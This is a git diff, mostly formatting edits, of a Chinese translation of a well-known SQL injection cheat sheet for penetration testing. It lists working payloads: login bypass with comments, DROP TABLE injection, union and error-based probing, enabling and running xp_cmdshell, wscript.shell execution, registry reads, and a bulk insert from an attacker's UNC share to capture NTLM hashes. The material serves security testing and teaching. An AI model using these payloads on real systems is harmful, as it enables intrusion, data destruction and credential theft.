@@ -1,4 +1,4 @@
-# SQL注入速查表（上）
+# SQL注入速查表
 <small>*本文由Yinzo翻译，转载请保留署名。原文地址：[http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell)*</small>
 
 <small>*文档版本：1.4*</small>
@@ -78,11 +78,11 @@
 
 + `--`(SM)
 
-	```DROP sampletable;-- ```
+	`DROP sampletable;-- `
 
 + `#`(M)
 
-	```DROP sampletable;# ```
+	`DROP sampletable;# `
 	
 #### 使用了行间注释的SQL注入攻击样例
 > 用户名:`admin'--`
@@ -100,7 +100,7 @@
 + `/*! MYSQL专属 */` (M) 
 
 	这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。
-	```SELECT /*!32302 1/0, */ 1 FROM tablename```
+	`SELECT /*!32302 1/0, */ 1 FROM tablename`
 
 #### 使用了行内注释的注入攻击样例
 > ID:`10; DROP TABLE members /*`
@@ -168,6 +168,7 @@
 
 	(HEXNUMBER:16进制数）
 	你能这样使用16进制数：
+	
 	+ `SELECT CHAR(0x66)`(S)
 
 	+ `SELECT 0x5045`(M) (这不是一个整数，而会是一个16进制字符串）
@@ -317,9 +318,9 @@
 
 + `' union select sum(columntofind) from users--` (S) 
 
-	```Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
-[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
-```	
+		Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+		[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
+
 	如果没有返回错误说明字段是**数字类型**
 + 同样的，你可以使用`CAST()`和`CONVERT()`
 	+ 	`SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`
@@ -343,10 +344,10 @@
 	
 + ……
 
-	```
-	Microsoft OLE DB Provider for SQL Server error '80040e07' 
-	Explicit conversion from data type int to image is not allowed.
-	```
+
+		Microsoft OLE DB Provider for SQL Server error '80040e07' 
+		Explicit conversion from data type int to image is not allowed.
+
 
 **你在遇到union错误之前会先遇到convert()错误**，所以先使用convert()再用union
 
@@ -374,11 +375,11 @@
 #### SQL Server的VBS/WSH(S)
 由于ActiveX的支持，你能在SQL Server中使用VBS/WSH
 
-```
-declare @o int 
-exec sp_oacreate 'wscript.shell', @o out 
-exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
-``` 
+
+	declare @o int 
+	exec sp_oacreate 'wscript.shell', @o out 
+	exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
+
 > Username: `'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- `
 
 #### 执行系统命令，xp_cmdshell(S)
@@ -411,6 +412,7 @@ exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
 1. 命令执行 (xp_cmdshell) 
 
 	`exec master..xp_cmdshell 'dir'`
+
 1. 注册表操作 (xp_regread)
 	1. xp_regaddmultistring
 	1. xp_regdeletekey
@@ -421,10 +423,10 @@ exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
 	1. xp_regremovemultistring
 	1. xp_regwrite 
 		
-		```
-		exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet		\Services\lanmanserver\parameters', 'nullsessionshares' 
-		exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM		\CurrentControlSet	\Services\snmp\parameters\validcommunities'
-		```		
+
+			exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet		\Services\lanmanserver\parameters', 'nullsessionshares' 
+			exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM		\CurrentControlSet	\Services\snmp\parameters\validcommunities'
+
 1. 管理服务(xp_servicecontrol)
 1. 媒体(xp_availablemedia)
 1. ODBC 资源 (xp_enumdsn)
@@ -434,10 +436,11 @@ exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
 1. 杀进程 (need PID) (xp_terminate_process)
 1. 新建进程 (*实际上你想干嘛都行*) 
 	
-	```
-	sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
-	exec xp_webserver
-	```
+	
+		sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
+		exec xp_webserver
+
+
 1. 写文件进UNC或者内部路径 (sp_makewebtask)
 
 #### 大量MSSQL笔记
@@ -467,13 +470,13 @@ OPENROWSET (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms190312.a
 ### 在SQL Server 2005中启用xp_cmdshell
 默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。
 
-```
-EXEC sp_configure 'show advanced options',1 
-RECONFIGURE
 
-EXEC sp_configure 'xp_cmdshell',1 
-RECONFIGURE
-```
+	EXEC sp_configure 'show advanced options',1 
+	RECONFIGURE
+
+	EXEC sp_configure 'xp_cmdshell',1 
+	RECONFIGURE
+
 
 ### 探测SQL Server数据库的结构(S)
 #### 获取用户定义表
@@ -625,14 +628,17 @@ query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,
 + `MD5()`
 	
 	MD5哈希
+
 + `SHA1()` 
 
 	SHA1哈希
+
 + `PASSWORD()`
 + `ENCODE()`
 + `COMPRESS()` 
 	
 	压缩数据，在盲注时读取大量数据很好用
+
 + `ROW_COUNT()`
 + `SCHEMA()`
 + `VERSION()`
@@ -652,7 +658,7 @@ query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,
 这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain & Abel)捕捉NTLM session。
 
 #### Bulk insert UNC共享文件 (S) 
-`bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'
+`bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'`
 
 ## 参考资料
 因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请[给我发邮件](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*，我会尽快更新。
@@ -700,6 +706,6 @@ query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,
 	+ SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)
 	+ [日文版SQL注入速查表发布](http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html) (*v1.1*)
 
-### To Do / Contact / Help
+### 待办事项 / 联系方式 / 帮助
 
 我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，[给我发邮件吧](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*
